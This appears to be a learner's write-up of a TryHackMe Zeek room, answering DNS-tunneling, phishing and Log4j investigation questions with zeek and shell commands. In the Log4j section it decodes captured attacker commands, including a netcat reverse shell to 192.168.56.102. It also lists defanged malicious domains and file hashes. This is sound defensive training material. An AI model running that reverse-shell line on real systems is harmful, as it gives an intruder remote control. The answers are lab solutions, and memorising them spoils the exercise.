#Subscribers 
https://tryhackme.com/room/zeekbroexercises

The room invites you a challenge to investigate a series of traffic data and stop malicious activity under different scenarios. Let's start working with Zeek to analyse the captured traffic.  

We recommend completing the [**Zeek**](https://tryhackme.com/room/zeekbro) room first, which will teach you how to use the tool in depth.

## task 2: anomalous DNS 

An alert triggered: "Anomalous DNS Activity".

The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive.

```
DNS "AAAA" records store IPV6 addresses.
Investigate the dns-tunneling.pcap file. Investigate the dns.log file. What is the number of DNS records linked to the IPv6 address?

zeek -C -r dns-tunneling.pcap 
cat dns.log | grep "AAAA" | wc -l
320

Investigate the conn.log file. What is the longest connection duration?
The "duration" value represents the connection time between two hosts.

cat conn.log | zeek-cut duration | sort -u
9.420791

Investigate the dns.log file. Filter all unique DNS queries. What is the number of unique domain queries?

cat dns.log | zeek-cut query | rev |cut -d '.' -f 1-2
cat dns.log | zeek-cut query | rev | cut -d '.' -f 1-2 | rev | sort | uniq | wc -l

6

There are a massive amount of DNS queries sent to the same domain. This is abnormal. Let's find out which hosts are involved in this activity. Investigate the conn.log file. What is the IP address of the source host?

cat conn.log | zeek-cut id.orig_h | uniq
10.20.57.3

```

## phishing 

An alert triggered: "Phishing Attempt".

The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive.

```
Investigate the logs. What is the suspicious source address? Enter your answer in defanged format.

zeek -C -r phishing.pcap
cat conn.log | zeek-cut id.orig_h | uniq
10.6.27.102

Investigate the http.log file. Which domain address were the malicious files downloaded from? Enter your answer in defanged format.

cat http.log | zeek-cut host 
smart-fax[.]com

Investigate the malicious document in VirusTotal. What kind of file is associated with the malicious document?

cat http.log | zeek-cut md5

Investigate the extracted malicious .exe file. What is the given file name in Virustotal?

b4b61ac67a6fa7fa4d1b91ea9442e6dc

cc28e40b46237ab6d5282199ef78c464

PleaseWaitWindow.exe

Investigate the malicious .exe file in VirusTotal. What is the contacted domain name? Enter your answer in defanged format.

hopto[.]org

Investigate the http.log file. What is the request name of the downloaded malicious .exe file?

cat http.log | zeek-cut uri | grep ".exe"
knr.exe

```

## log4j

**An alert triggered:** "Log4J Exploitation Attempt".

The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive.

```
Investigate the log4shell.pcapng file with detection-log4j.zeek script. Investigate the signature.log file. What is the number of signature hits?

zeek -C -r log4shell.pcapng
zeek -C -r log4shell.pcapng detection-log4j.zeek 

cat signatures.log | zeek-cut sig_id | wc -l
3

Investigate the http.log file. Which tool is used for scanning? User-agent info can help.

cat http.log | zeek-cut user_agent | sort -u
nmap

Investigate the http.log file. What is the extension of the exploit file? Uri info can help.

cat http.log | zeek-cut uri resp_mime_types | sort -u
.class

Investigate the log4j.log file. Decode the base64 commands. What is the name of the created file?  "echo 'base64 data' | base64 --decode"

cat log4j.log | grep -i "command"

dG91Y2ggL3RtcC9wd25lZAo=
d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==
dG91Y2ggL3RtcC9wd25lZAo=
d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==
bmMgMTkyLjE2OC41Ni4xMDIgODAgLWUgL2Jpbi9zaCAtdnZ2Cg==

touch /tmp/pwned
which nc > /tmp/pwned
touch /tmp/pwned
which nc > /tmp/pwned
nc 192.168.56.102 80 -e /bin/sh -vvv

pwned

```

